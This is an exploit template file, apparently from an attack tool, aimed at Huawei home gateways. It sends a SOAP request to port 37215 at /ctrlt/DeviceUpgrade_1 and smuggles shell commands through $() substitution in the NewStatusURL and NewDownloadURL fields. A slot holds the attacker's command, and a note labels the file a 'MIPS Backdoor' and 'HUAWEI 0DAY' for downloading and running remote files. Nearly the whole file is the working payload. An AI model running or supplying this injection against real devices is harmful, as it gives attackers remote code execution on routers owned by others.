exploit/华为网关远程文件下载执行.bpf

<cs1mc>MIPS Backdoor</cs1mc>
<zbz>1</zbz>
<bz1>
<sfjt>post</sfjt>
<dzkz>:37215/ctrlt/DeviceUpgrade_1</dzkz>
<demo><?xml version="1.0" ?>
    <s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
    <s:Body><u:Upgrade xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1">
    <NewStatusURL>$(<cs1/>)</NewStatusURL>
<NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL>
</u:Upgrade>
    </s:Body>
    </s:Envelope></demo>
<cl>User-Agent: nmlgb-requests/6.6.6
Accept-Encoding: gzip, deflate</cl>
</bz1>
<bz>HUAWEI "0"DAY
执行地址前加 http://</bz>